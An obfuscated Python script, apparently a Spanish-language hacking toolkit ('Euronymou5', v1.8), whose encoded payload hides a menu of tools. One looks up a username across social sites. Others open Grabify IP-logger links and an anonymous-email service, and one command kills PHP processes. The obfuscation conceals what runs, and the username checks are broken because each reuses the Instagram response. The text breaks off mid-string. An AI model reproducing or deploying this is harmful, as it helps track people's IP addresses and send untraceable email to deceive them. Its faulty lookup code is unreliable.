# ---------------- Herramienta de codigo cerrado ---------------- #
import base64, codecs
magic = 'aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCByYW5kb20KaW1wb3J0IHB5c2hvcnRlbmVycwppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHB5cXJjb2RlCmltcG9ydCBwbmcKZnJvbSBmYWtlciBpbXBvcnQgRmFrZXIKaW1wb3J0IHdlYmJyb3dzZXIKCmNsYXNzIENvbG9yZXM6CiAgcmVkPSJcMDMzWzMxOzFtIgogIHZlcmRlPSJcMDMzWzkybSIKICBhenVsPSJcMDMzWzk0bSIKICBtYWdlbnRhPSJcMDMzWzM2bSIKICBhbWFyaWxsbz0iXDAzM1szM20iCiAgCm9zLnN5c3RlbSgia2lsbGFsbCBwaHAiKQpvcy5zeXN0ZW0oImNsZWFyIikKcmFuZG9tY29sb3I9W0NvbG9yZXMucmVkLENvbG9yZXMudmVyZGUsQ29sb3Jlcy5henVsLENvbG9yZXMubWFnZW50YV0KI3JhbmRvbS5zaHVmZmxlKHJhbmRvbWNvbG9yKQpsb2dvID0gQ29sb3Jlcy5yZWQgKyAnJycKwrfiloTiloTiloTiloQgICAgICAgIOKWkOKWhOKAoiDiloQg4paQ4paE4oCiIOKWhCDiloTiloTiloQgLuKWhOKWhOKWhCAgICAgIOKWhOKWhOKWhOKWhOKWhCAgICAgICAgICAgIOKWhOKWhOKWjCAg4paEIOKAouKWhCDilqogIOKWhOKWhOKWhOKWhOKWhArilojilojilqog4paI4paIIOKWqiAgICAgIOKWiOKWjOKWiOKWjOKWqiDilojilozilojilozilqriloDiloQu4paAwrfiloDiloQg4paIwrcgICAg4oCi4paI4paIICDilqogICAgIOKWqiAgICAg4paI4paI4oCiICDilojiloziloTilozilqrilojilogg4oCi4paI4paIICAK4paQ4paIwrcg4paQ4paI4paMIOKWhOKWiOKWgOKWhCAgwrfilojilojCtyAgwrfilojilojCtyDilpDiloDiloDilqriloTilpDiloDiloDiloQgICAgICDilpDilogu4paqIOKWhOKWiOKWgOKWhCAg4paE4paI4paA4paEIOKWiOKWiOKWqiAg4paQ4paA4paA4paEwrfilpDilojCtyDilpDilogu4paqCuKWiOKWiC4g4paI4paIIOKWkOKWiOKWjC7ilpDilozilqrilpDilojCt+KWiOKWjOKWquKWkOKWiMK34paI4paM4paQ4paI4paE4paE4paM4paQ4paI4oCi4paI4paMICAgICDilpDilojilozCt+KWkOKWiOKWjC7ilpDilozilpDilojilowu4paQ4paM4paQ4paI4paM4paQ4paM4paQ4paILuKWiOKWjOKWkOKWiOKWjCDilpDilojilozCtwriloDiloDiloDiloDiloDigKIgIOKWgOKWiOKWhOKWgOKWquKAouKWgOKWgCDiloDiloDigKLiloDiloAg4paA4paAIOKWgOKWgOKWgCAu4paAICDiloAgICAgIOKWgOKWgOKWgCAg4paA4paI4paE4paA4paqIOKWgOKWiOKWhOKWgOKWqi7iloDiloDiloAgwrfiloAgIOKWgOKWgOKWgOKWgCDiloDiloDiloAgCiAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBCeTogIEV1cm9ueW1vdTUKICAgICAgICAgICAgICAgICAgICBfX19fX19fX19fX19fX18KCiAgICAgICAgICAgICAgICAgICAgIFZlcnNpb246IHYxLjgKICAgICAgICAgICAgICAgICAgICAgX19fX19fX19fX19fXwonJycKCmRlZiBzaGVyKCk6CiAgcHJpbnQoZid7Q29sb3Jlcy52ZXJkZX1bfl0gQXRlbmNpb24gbm8gc2llbXByZSBsb3MgcmVzdWx0YWRvcyBzb24gMTAwJSBwcmVjaXNvcycpCiAgdXN1YXJpbyA9IGlucHV0KGYne0NvbG9yZXMucmVkfVt+XSBJbmdyZXNhIGVsIG5vbWJyZSBkZWwgdXN1YXJpbzogJykKICBwcmludCgnICcpCiAgdXJsID0gImh0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vIiArIHVzdWFyaW8KICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCiAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgcmVzcG9uc2UuY2xvc2UoKQogICAgcHJpbnQoZidbfl0gVXN1YXJpbyBlbmNvbnRyYWRvIGVuIEluc3RhZ3JhbSE6IHt1cmx9JykKICAgIHRpbWUuc2xlZXAoMikKICBlbHNlOgogICAgcHJpbnQoJ1t+XSBVc3VhcmlvIG5vIGVuY29udHJhZG8gZW4gSW5zdGFncmFtIScpCiAgICB0aW1lLnNsZWVwKDIpCiAgIy0tLS0tLS0tLS0tLS0tLS0tVHdpdHRlci0tLS0tLS0tLS0tLS0tLS0tLS0KICBwcmludCgnICcpCiAgdXJsID0gImh0dHBzOi8vdHdpdHRlci5jb20vIiArIHVzdWFyaW8KICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICByZXNwb25zZS5jbG9zZSgpCiAgICBwcmludChmJ1t+XSBVc3VhcmlvIGVuY29udHJhZG8gZW4gVHdpdHRlciE6IHt1cmx9JykKICAgIHRpbWUuc2xlZXAoMikKICBlbHNlOgogICAgcHJpbnQoJ1t+XSBVc3VhcmlvIG5vIGVuY29udHJhZG8gZW4gVHdpdHRlciEnKQogICAgdGltZS5zbGVlcCgyKQogICMtLS0tLS0tLS0tLS0tLVJlZGl0dC0tLS0tLS0tLS0tLS0tLS0tLQogIHByaW50KCcgJykKICB1cmwgPSAiaHR0cHM6Ly93d3cucmVkZGl0LmNvbS91c2VyLyIgKyB1c3VhcmlvCiAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgcmVzcG9uc2UuY2xvc2UoKQogICAgcHJpbnQoZidbfl0gVXN1YXJpbyBlbmNvbnRyYWRvIGVuIHJlZGRpdCE6IHt1cmx9JykKICAgIHRpbWUuc2xlZXAoMikKICBlbHNlOgogICAgcHJpbnQoJ1t+XSBVc3VhcmlvIG5vIGVuY29udHJhZG8gZW4gcmVkZGl0IScpCiAgICB0aW1lLnNsZWVwKDIpCiAgIy0tLS0tLS0tLS0tLS0tUGludGlyZXN0LS0tLS0tLS0tLS0tLS0KICBwcmludCgnICcpCiAgdXJsID0gZiJodHRwczovL3d3dy5waW50ZXJlc3QuY29tL3t1c3VhcmlvfS8iCiAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgcmVzcG9uc2UuY2xvc2UoKQogICAgcHJpbnQoZidbfl0gVXN1YXJpbyBlbmNvbnRyYWRvIGVuIFBpbnRlcmVzdCE6IHt1cmx9JykKICAgIHRpbWUuc2xlZXAoMikKICBlbHNlOgogICAgcHJpbnQoJ1t+XSBVc3VhcmlvIG5vIGVuY29udHJhZG8gZW4gUGludGVyZXN0IScpCiAgICB0aW1lLnNsZWVwKDIpCiAgIy0tLS0tLS0tLS0tLS0tLS0tUG9ybmh1Yi0tLS0tLS0tLS0tLQogIHByaW50KCcgJykKICB1cmwgPSAiaHR0cHM6Ly9wb3JuaHViLmNvbS91c2Vycy8iICsgdXN1YXJpbwogIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgIHJlc3BvbnNlLmNsb3NlKCkKICAgIHByaW50KGYnW35dIFVzdWFyaW8gZW5jb250cmFkbyBlbiBQb3JuaHViIToge3VybH0nKQogICAgdGltZS5zbGVlcCgyKQogIGVsc2U6CiAgICBwcmludCgnW35dIFVzdWFyaW8gbm8gZW5jb250cmFkbyBlbiBQb3JuaHViIScpCiAgICB0aW1lLnNsZWVwKDIpCiAgIy0tLS0tLS0tLS0tLS0tLS0tLS0tWW91dHViZS0tLS0tLS0tLS0tCiAgcHJpbnQoJyAnKQogIHVybCA9ICJodHRwczovL3d3dy55b3V0dWJlLmNvbS8iICsgdXN1YXJpbwogIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgIHJlc3BvbnNlLmNsb3NlKCkKICAgIHByaW50KGYnW35dIFVzdWFyaW8gZW5jb250cmFkbyBlbiBZb3V0dWJlIToge3VybH0nKQogICAgdGltZS5zbGVlcCgyKQogIGVsc2U6CiAgICBwcmludCgnW35dIFVzdWFyaW8gbm8gZW5jb250cmFkbyBlbiBZb3V0dWJlIScpCiAgICB0aW1lLnNsZWVwKDIpCiAgIy0tLS0tLS0tLS0tLS0tLS0tLVhib3gtLS0tLS0tLS0tLS0tLS0tLS0KICBwcmludCgnICcpCiAgdXJsID0gImh0dHBzOi8veGJveGdhbWVydGFnLmNvbS9zZWFyY2gvIiArIHVzdWFyaW8KICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICByZXNwb25zZS5jbG9zZSgpCiAgICBwcmludChmJ1t+XSBVc3VhcmlvIGVuY29udHJhZG8gZW4gWGJveCE6IHt1cmx9JykKICAgIHRpbWUuc2xlZXAoMikKICBlbHNlOgogICAgcHJpbnQoJ1t+XSBVc3VhcmlvIG5vIGVuY29udHJhZG8gZW4gWGJveCEnKQogICAgdGltZS5zbGVlcCgyKQogICMtLS0tLS0tLS0tLS0tLS0tLS0tLS1TcG90aWZ5LS0tLS0tLS0tLS0tCiAgcHJpbnQoJyAnKQogIHVybCA9ICJodHRwczovL29wZW4uc3BvdGlmeS5jb20vdXNlci8iICsgdXN1YXJpbwogIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgIHJlc3BvbnNlLmNsb3NlKCkKICAgIHByaW50KGYnW35dIFVzdWFyaW8gZW5jb250cmFkbyBlbiBTcG90aWZ5IToge3VybH0nKQogICAgdGltZS5zbGVlcCgyKQogIGVsc2U6CiAgICBwcmludCgnW35dIFVzdWFyaW8gbm8gZW5jb250cmFkbyBlbiBTcG90aWZ5IScpCiAgICB0aW1lLnNsZWVwKDIpCiAgIy0tLS0tLS0tLS0tLS0tLS0tLVBhdHJlb24tLS0tLS0tLS0tLS0tCiAgcHJpbnQoJyAnKQogIHVybCA9ICJodHRwczovL3d3dy5wYXRyZW9uLmNvbS8iICsgdXN1YXJpbwogIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgIHJlc3BvbnNlLmNsb3NlKCkKICAgIHByaW50KGYnW35dIFVzdWFyaW8gZW5jb250cmFkbyBlbiBQYXRyZW9uIToge3VybH0nKQogICAgdGltZS5zbGVlcCgyKQogIGVsc2U6CiAgICBwcmludCgnW35dIFVzdWFyaW8gbm8gZW5jb250cmFkbyBlbiBQYXRyZW9uIScpCiAgICB0aW1lLnNsZWVwKDIpCiAgIy0tLS0tLS0tLS0tLU15c3BhY2UtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogIHByaW50KCcgJykKICB1cmwgPSAiaHR0cHM6Ly9teXNwYWNlLmNvbS8iICsgdXN1YXJpbwogIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgIHJlc3BvbnNlLmNsb3NlKCkKICAgIHByaW50KGYnW35dIFVzdWFyaW8gZW5jb250cmFkbyBlbiBNeXNwYWNlIToge3VybH0nKQogICAgdGltZS5zbGVlcCgyKQogIGVsc2U6CiAgICBwcmludCgnW35dIFVzdWFyaW8gbm8gZW5jb250cmFkbyBlbiBNeXNwYWNlIScpCiAgICB0aW1lLnNsZWVwKDIpCiAgIy0tLS0tLS0tLS0tLS0tLU15YW5pbWVsaXN0LS0tLS0tLS0tLS0tLS0tLQogIHByaW50KCcgJykKICB1cmwgPSAiaHR0cHM6Ly9teWFuaW1lbGlzdC5uZXQvcHJvZmlsZS8iICsgdXN1YXJpbwogIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgIHJlc3BvbnNlLmNsb3NlKCkKICAgIHByaW50KGYnW35dIFVzdWFyaW8gZW5jb250cmFkbyBlbiBNeWFuaW1lbGlzdCE6IHt1cmx9JykKICAgIHRpbWUuc2xlZXAoMikKICBlbHNlOgogICAgcHJpbnQoJ1t+XSBVc3VhcmlvIG5vIGVuY29udHJhZG8gZW4gTXlhbmltZWxpc3QhJykKICAgIHRpbWUuc2xlZXAoMikKICAjLS0tLS0tLS0tLS0tLS0tLS1HaXRodWItLS0tLS0tLS0tLS0tLQogIHByaW50KCcgJykKICB1cmwgPSAiaHR0cHM6Ly9naXRodWIuY29tLyIgKyB1c3VhcmlvCiAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgcmVzcG9uc2UuY2xvc2UoKQogICAgcHJpbnQoZidbfl0gVXN1YXJpbyBlbmNvbnRyYWRvIGVuIEdpdGh1YiE6IHt1cmx9JykKICAgIHRpbWUuc2xlZXAoMikKICBlbHNlOgogICAgcHJpbnQoJ1t+XSBVc3VhcmlvIG5vIGVuY29udHJhZG8gZW4gR2l0aHViIScpCiAgICB0aW1lLnNsZWVwKDIpCiAgIy0tLS0tLS0tLS0tLS0tLS1Ud2l0Y2gtLS0tLS0tLS0tLQogIHByaW50KCcgJykKICB1cmwgPSAiaHR0cHM6Ly93d3cudHdpdGNoLnR2LyIgKyB1c3VhcmlvCiAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgcmVzcG9uc2UuY2xvc2UoKQogICAgcHJpbnQoZidbfl0gVXN1YXJpbyBlbmNvbnRyYWRvIGVuIFR3aXRjaCE6IHt1cmx9JykKICAgIHRpbWUuc2xlZXAoMikKICBlbHNlOgogICAgcHJpbnQoJ1t+XSBVc3VhcmlvIG5vIGVuY29udHJhZG8gZW4gVHdpdGNoIScpCiAgICB0aW1lLnNsZWVwKDIpCgpkZWYgaXBsb2coKToKICBvcy5zeXN0ZW0oImNsZWFyIikKICBwcmludChsb2dvKQogIHByaW50KCdcblt+XSBJbmdyZXN'
love = 'uVUIhLFOipTAco24hWlxXVPOjpzyhqPtaWlqpotbtVSfkKFOWHTkiM2qypv5ipzpXVPNXVPOoZy0tE3WuLzyzrDbtVNbtVSfmKFOQpzIupvO1ovOfnJ5eVRyDoT9aM2IlVNbtVNbtVSfjZS0tHzIapzImLKVtLJjtoJIhqFOjpzyhL2yjLJjXVPNXVPOoBGyqVSAuoTylPvNtWlpaXDbtVT9jLlN9VTyhqPucoaO1qPtaJ35qVRIfnJcyVUIhLFOipTAco246VPpcXDbtVTyzVT9jLlN9CFNkBtbtVPNtpUWcoaDbW1khJmSqVRSvpzylVTkcozftpTSlLFOfnJ51rPpcPvNtVPOjpzyhqPtaKT5oZy0tDJWlnKVtoTyhnlOjLKWuVUEypz11rPpcPvNtVPOjpzyhqPtaKT5oZQOqVSWyM3Wyp2SlVTSfVT1yoaHtLJ50MKWco3VaXDbtVPNtpUWcoaDbW1khJmx5KFOGLJkcpvpcPvNtVPOGn2DtCFOcoaDbnJ5jqKDbW1g+KFOSoTydMFO1ozRto3OwnJ9hBvNaXFxXVPNtVTyzVSAeMPN9CFNkBtbtVPNtVPO3MJWvpz93p2IlYz9jMJ4bW2u0qUOmBv8inKOfo2qaMKVho3WaY2ImYlpcPvNtVPNtVTyjoT9aXPxXVPNtVTIfnJLtH2gxVQ09VQV6PvNtVPNtVT9mYaA5p3EyoFtvqTIloKI4YJ9jMJ4tnUE0pUZ6Yl9cpTkiM2qypv5ipzpiMKZiVvxXVPNtVPNtnKOfo2pbXDbtVPNtMJkcMvOGn2DtCG0tZQN6PvNtVPNtVTyjoT9aXPxXVPNtVTIfnJLtH2gxVQ09VQx5BtbtVPNtVPOyrTy0XPxXVPNtVTIfp2H6PvNtVPNtVUOlnJ50XPqosy0tEKWlo3Vto3OwnJ9hVTyhqzSfnJEuYvpcPvNtVPNtVUEcoJHhp2kyMKNbZvxXVPNtVPNtnKOfo2pbXDbtVTIfnJLto3OwVQ09VQV6PvNtVPOjpzyhqPtaKT5oZI0tDJWlnKVtoTyhnlOjLKWuVTkcoaI4WlxXVPNtVUOlnJ50XPqpoyflKFOOLaWcpvOfnJ5eVUOupzRtqTIloKI4WlxXVPNtVUOlnJ50XPqpoyfjZS0tHzIapzImLKVtLJjtoJIhqFOjpzyhL2yjLJjaXDbtVPNtpUWcoaDbW1khJmx5KFOGLJkcpvpcPvNtVPOZDFN9VTyhqPucoaO1qPtaJ35qVRIfnJcyVUIhLFOipTAco246VPpcXDbtVPNtnJLtGRRtCG0tZGbXVPNtVPNtq2IvLaWiq3Aypv5ipTIhXPqbqUEjpmbiY2qlLJWcMaxhoTyhnl8aXDbtVPNtVPOcpTkiMltcPvNtVPOyoTyzVRkOVQ09VQV6PvNtVPNtVT9mYaA5p3EyoFtvqTIloKI4YJ9jMJ4tnUE0pUZ6Yl9apzSvnJM5YzkcozfiVvxXVPNtVPNtnKOfo2pbXDbtVPNtMJkcMvOZDFN9CFNjZQbXVPNtVPNtnKOfo2pbXDbtVPNtMJkcMvOZDFN9CFN5BGbXVPNtVPNtMKucqPtcPvNtVPOyoUAyBtbtVPNtVPOjpzyhqPtaJ35qVRIlpz9lVT9jL2yiovOcoaMuoTyxLF4aXDbtVPNtVPO0nJ1yYaAfMJIjXQVcPvNtVPNtVTyjoT9aXPxXVPOyoTyzVT9jLlN9CFNmBtbtVPNtpUWcoaDbMvqpoagQo2kipzImYaMypzEysIg+KFOZLKZtFINtp2HtM3IupzEupzShVTIhBvORo3u4MKVgIT9ioTgcqP8hpTSaMKZiFIOfo2qaMKVinKNhqUu0WlxXVPNtVUOlnJ50XTLaKT57D29fo3Wypl5uoJSlnJkfo31osy0tHUIyMTImVUMypvOfLKZtFINtL29hVTIfVTAioJShMT86VTAuqPORo3u4MKVgIT9ioTgcqP8hpTSaMKZiFIOfo2qaMKVinKNhqUu0WlxXVPNtVUOlnJ50XTLaKT57D29fo3Wypl5gLJqyoaEusIg+KFODLKWuVUAuoTylVUOlMKAco25uVRAHHxjtXlOQWlxXVPNtVUOlnJ50XPptWlxXVPNtVTAgMPN9VPWjnUNtYKDtYaOuM2ImY0yDoT9aM2IlVP1GVTkiL2SfnT9mqQb4ZQtjVPLtp3AbVP1FVQtjBzkiL2SfnT9mqQb4ZQtjVT5in2I5DTkiL2SfnT9mqP5lqJ4vPvNtVPOjVQ0tp3IvpUWiL2Impl5Do3OyovuwoJDfVUAbMJkfCIElqJHcPvNtVPOuVQ0tpP5wo21gqJ5cL2S0MFtcJmOqPvNtMJkcMvOipTZtCG0tZQN6PvNtVPOipl5mrKA0MJ0bVzAfMJSlVvxXVPNtVT1yoaHbXDbtVTIfnJLto3OwVQ09VQx5BtbtVPNtMKucqPtcPvNtMJkmMGbXVPNtVUOlnJ50XPqosy0tEKWlo3Vto3OwnJ9hVTyhqzSfnJEuYvpcPvNtVPO0nJ1yYaAfMJIjXQVcPvNtVPOipl5mrKA0MJ0bVzAfMJSlVvxXVPNtVUOlnJ50XTkiM28cPvNtVPOcpTkiMltcPvNtPzEyMvOzLJgypaVbXGbXVPOjpzyhqPuzWlpar0AioT9lMKZhpzIxsIkhPvNtJmSqVRqyozIlLKVtnKO2APOTLJkmLDbtVNbtVSflKFOUMJ5ypzSlVT51oJIlolOxMFO0MJkyMz9holOzLJkmojbtVNbtVSfmKFOUMJ5ypzSlVSOypzMcoPOxMFO1ozRtpTIlp29hLFOzLJkmLDbtVNbtVSf0KFOUMJ5ypzSlVSImMKVgLJqyoaEmVTMuoUAipjbXVPOoAI0tE2IhMKWupvO0LKWdMKEuVTEyVTAlMJEcqT8tMzSfp2RXVPNtVNbtVSfjZS0tHzIapzImLKVtLJjtoJIhqFOjpzyhL2yjLJjXVPNXVPOoBGyqVSAuoTylPvNtWlpaXDbtVTMun2ftCFOcoaDbnJ5jqKDbW1g+KFOSoTydMFO1ozRto3OwnJ9hBvNaXFxXVPOcMvOzLJgeVQ09VQR6PvNtVPOjpzyhqPtaKT5osy0tE2IhMKWuozEiVUIhLFOWHUL0VTMuoUAuYv4hWlxXVPNtVUEcoJHhp2kyMKNbZvxXVPNtVTyjVQ0tVv4vYzcinJ4boJSjXUA0pvjtXUWuozEioF5lLJ5xnJ50XQNfVQV1AFxXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTMipvOsVTyhVUWuozqyXQDcXFxcPvNtVPOjpzyhqPuzW3gQo2kipzImYaMypzEysIg+KFOWHPOzLJkmLFOaMJ5ypzSxLGbtr2yjsFpcVNbtVPNtMzSeMKWlXPxXVPOyoTyzVTMun2ftCG0tZwbXVPNtVTMun2HtCFOTLJgypvtcPvNtVPOTLJgypv5mMJIxXQNcPvNtVPOjpzyhqPtaJ35qVRA1LJ50LKZtqzIwMKZtpKIcMKWyplOaMJ5ypzSlVUIhVT51oJIlolOzLJkmom8aXDbtVPNtoaIgVQ0tnJ50XTyhpUI0XPqosy0tEKAwpzyvMFO1ovOhqJ1ypz86VPpcXDbtVPNtpUWcoaDbW1g+KFOUMJ5ypzShMT8toaIgMKWiVTEyVUEyoTIzo25iVTMuoUAiYv4hWlxXVPNtVUEcoJHhp2kyMKNbZFxXVPNtVTMipvOsVTyhVUWuozqyXT51oFx6PvNtVPNtVUOlnJ50XTMun2HhpTuiozIsoaIgLzIlXPxcPvNtVPOzLJgypaVbXDbtVTIfnJLtMzSenlN9CFNmBtbtVPNtMzSeMFN9VRMun2IlXPxXVPNtVRMun2IlYaAyMJDbZPxXVPNtVUOlnJ50XPqosy0tD3IuoaEuplO2MJAyplOkqJyypzImVTqyozIlLKVtqJ4tpTIlMzyfVTMuoUAiClpcPvNtVPOhqJ0tCFOcoaDbnJ5jqKDbW1g+KFOSp2AlnJWyVUIhVT51oJIlombtWlxcPvNtVPOjpzyhqPtaJ35qVRqyozIlLJ5xolO1ovOjMKWznJjtMzSfp28hYv4aXDbtVPNtqTygMF5moTIypPtkXDbtVPNtMz9lVS8tnJ4tpzShM2HboaIgXGbXVPNtVPNtpUWcoaDbMzSeMF5jpz9znJkyXPxcPvNtVPOzLJgypaVbXDbtVTIfnJLtMzSenlN9CFN0BtbtVPNtMzSeMFN9VRMun2IlXPxXVPNtVRMun2IlYaAyMJDbZPxXVPNtVUOlnJ50XPqosy0tD3IuoaEuplO2MJAyplOkqJyypzImVTqyozIlLKVtqJ4tqKAypv1uM2IhqQ8aXDbtVPNtoaIgVQ0tnJ50XTyhpUI0XPqosy0tEKAwpzyvMFO1ovOhqJ1ypz86VPpcXDbtVPNtpUWcoaDbW1g+KFOUMJ5ypzShMT8tqJ4tqKAypvOuM2IhqPOzLJkmol4hYvpcPvNtVPO0nJ1yYaAfMJIjXQRcPvNtVPOzo3VtKlOcovOlLJ5aMFuhqJ0cBtbtVPNtVPOjpzyhqPuzLJgyYaImMKWsLJqyoaDbXFxXVPNtVTMun2IlpvtcPvNtMJkcMvOzLJgeVQ09VQH6PvNtVPOzLJgyVQ0tEzSeMKVbXDbtVPNtEzSeMKVhp2IyMPtjXDbtVPNtpUWcoaDbW1g+KFOQqJShqTSmVUMyL2ImVUS1nJIlMKZtM2IhMKWupvO1ozRtqTIlnzI0LFOxMFOwpzIxnKEiClpcPvNtVPOhqJ0tCFOcoaDbnJ5jqKDbW1g+KFOSp2AlnJWyVUIhVT51oJIlombtWlxcPvNtVPOjpzyhqPtaJ35qVRqyozIlLJ5xolO1ozRtqTSlnzI0LFOxMFOwpzIxnKEiVTMuoUAuYv4hWlxXVPNtVUEcoJHhp2kyMKNbZFxXVPNtVTMipvOsVTyhVUWuozqyXT51oFx6PvNtVPNtVUOlnJ50XTMun2HhL3WyMTy0K2AupzEsMaIfoPtcXDbtVPNtMzSeMKWlXPxXVPOyoTyzVTMun2ftCG0tZQN6PvNtVPOipl5mrKA0MJ0bVzAfMJSlVvxXVPNtVT1yoaHbXDbtVTIfnJLtMzSenlN9CFN5BGbXVPNtVTI4nKDbXDbtVTIfp2H6PvNtVPOjpzyhqPtaJ35qVRIlpz9lVT9jL2yiovOcoaMuoTyxLF4aXDbtVPNtqTygMF5moTIypPtlXDbtVPNto3Zhp3ymqTIgXPWwoTIupvVcPvNtVPOjpzyhqPufo2qiXDbtVPNtMzSeMKWlXPxXPzEyMvOaMJ9cpPtcBtbtVUOlnJ50XPqpoyfkKFOUMJ9fo2AuoTy6LKVtFINaXDbtVUOlnJ50XPqpoyfjZS0tHzIapzImLKVtLJjtoJIhqFOjpzyhL2yjLJjaXDbtVUOlnJ50XPqpoyf5BI0tH2SfnKVaXDbtVR1QVQ0tnJ50XTyhpUI0XPqpoyg+KFOSoTydMFO1ozRto3OwnJ9hBvNaXFxXVPOcMvOADlN9CFNkBtbtVPNtVPNtVT9mYaA5p3EyoFuzVzAxVP5aMJ8tWvLtpUy0nT9hZlOaMJ8hpUxvXDbtVTIfnJLtGHZtCG0tZQN6PvNtVPOgMJ51XPxXVPOyoTyzVR1QVQ09VQx5BtbtVPNtMKucqPtcPvNtMJkmMGbXVPNtVUOlnJ50XPqosy0tEKWlo3Vto3OwnJ9hVTyhqzSfnJEuYvpcPvNtVPO0nJ1yYaAfMJIjXQVcPvNtVPOipl5mrKA0MJ0bVzAfMJSlVvxXVPNtVUOlnJ50XTkiM28cPvNtVPOaMJ9cpPtcPvNtVPNXPzEyMvOyoJScoTMunltcBtbtVT9mYaA5p3EyoFtvL2kyLKVvXDbtVUOlnJ50XTkiM28cPvNtpUWcoaDbW1khJ35qVRyhM3Wyp2RtqJ5uVT9jL2yiovpcPvNtpUWcoaDbW1khJmSqVRIgn2IcWlxXVPOjpzyhqPtaKT5oZy0tDJ5iozIgLJyfVPuOoz9hrJ1iqKAyXFpcPvNtpUWcoaDbW1khJmAqVSEyoKNgGJScoPpcPvNtpUWcoaDbW1khJmNjKFOFMJqlMKAupvOuoPOgMJ51VUOlnJ5wnKOuoPpcPvNtpUWcoaDbW1khJmx5KFOGLJkcpvpcPvNtG1NtCFOcoaDbnJ5jqKDbW1g+KFOSoTydMFO1ozRto3OwnJ9hBvNaXFxXVPOcMvOCHPN9CFNkBtbtVPNto3Zhp3ymqTIgXPWwoTIupvVcPvNtVPOjpzyhqPufo2qiXDbtVPNtpUWcoaDbW1khJmSqVRSvpzylVTkcozftpTSlLFOfnJ51rPpcPvNtVPOjpzyhqPtaKT5oZy0tDJWlnKVtoTyhnlOjLKWuVUEypz11rPpcPvNtVPOjpzyhqPtaKT5oZQOqVSWyM3Wyp2SlVTSfVT1yoaHtpUWcozAcpTSfWlxXVPNtVUOlnJ50XPqpoyf5BI0tH2SfnKVaXDbtVPNtLaW1nPN9VTyhqPucoaO1qPtaJ35qVRIfnJcyVUIhLFOipTAco246VPpcXDbtVPNtnJLtLaW1nPN9CFNkBtbtVPNtVPO3MJWvpz93p2IlYz9jMJ4bW2u0qUOmBv8iMJ1eMJxhL3biWlxXVPNtVPNtMJ1unJkzLJfbXDbtVPNtMJkcMvOvpaIbVQ09VQV6PvNtVPNtVT9mYaA5p3EyoFtvqTIloKI4YJ9jMJ4tnUE0pUZ6Yl9yoJgynF5wrv8vXDbtVPNtVPOyoJScoTMunltcPvNtVPOyoTyzVTWlqJttCG0tZQN6PvNtVPNtVT9mYaA5p3EyoFtvL2kyLKVvXDbtVPNtVPOjpzyhqPufo2qiXDbtVPNtVPOyoJScoTMunltcPvNtVPOyoTyzVTWlqJttCG0tBGx6PvNtVPNtVTI4nKDbXDbtVPNtMJkmMGbXVPNtVPNtVUOlnJ50XPqosy0tEKWlo3Vto3OwnJ9hVTyhqzSfnJEuYvpcPvNtVPNtVPO0nJ1yYaAfMJIjXQVcPvNtVPNtVPOyoJScoTMunltcPvNtMJkcMvOCHPN9CFNlBtbtVPNto3Zhp3ymqTIgXPWwoTIupvVcPvNtVPOjpzyhqPufo2qiXDbtVPNtpUWcoaDbW1khJmSqVRSvpzylVTkcozftpTSlLFOfnJ51rPpcPvNtVPOjpzyhqPtaKT5oZy0tDJWlnKVtoTyhnlOjLKWuVUEypz11rPpcPvNtVPOjpzyhqPtaKT5oZQOqVSWyM3Wyp2SlVTSfVT1yoaHtpUWcozAcpTSfWlxXVPNtVUOlnJ50XPqpoyf5BI0tH2SfnKVaXDbtVPNtLaW1nPN9VTyhqPucoaO1qPtaJ35qVRIfnJcyVUIhLFOipTAco246VPpcXDbtVPNtnJLtLaW1nPN9CFNkBtbtVPNtVPO3MJWvpz93p2IlYz9jMJ4bW2u0qUN6Yl9uoz9hrJ1iqKAyYz9lMl9uoz9hMJ1unJjhnUEgoPpcPvNtVPNtVTIgLJyfMzSeXPxXVPNtVTIfnJLtLaW1nPN9CFNlBtbtVPNtVPOipl5mrK'
god = 'N0ZW0oInRlcm11eC1vcGVuIGh0dHA6Ly9hbm9ueW1vdXNlLm9yZy9hbm9uZW1haWwuaHRtbCIpCiAgICAgIGVtYWlsZmFrKCkKICAgIGVsaWYgYnJ1aCA9PSAwMDoKICAgICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICAgIHByaW50KGxvZ28pCiAgICAgIGVtYWlsZmFrKCkKICAgIGVsaWYgYnJ1aCA9PSA5OToKICAgICAgZXhpdCgpCiAgICBlbHNlOgogICAgICAgcHJpbnQoJ1t+XSBFcnJvciBvcGNpb24gaW52YWxpZGEuJykKICAgICAgIHRpbWUuc2xlZXAoMikKICAgICAgIGVtYWlsZmFrKCkKICBlbGlmIE9QID09IDM6CiAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgIHByaW50KGxvZ28pCiAgICBwcmludCgnXG5bMV0gQWJyaXIgbGluayBwYXJhIGxpbnV4JykKICAgIHByaW50KCdcblsyXSBBYnJpciBsaW5rIHBhcmEgdGVybXV4JykKICAgIHByaW50KCdcblswMF0gUmVncmVzYXIgYWwgbWVudSBwcmluY2lwYWwnKQogICAgcHJpbnQoJ1xuWzk5XSBTYWxpcicpCiAgICBicnVoID0gaW50KGlucHV0KCdbfl0gRWxpamUgdW5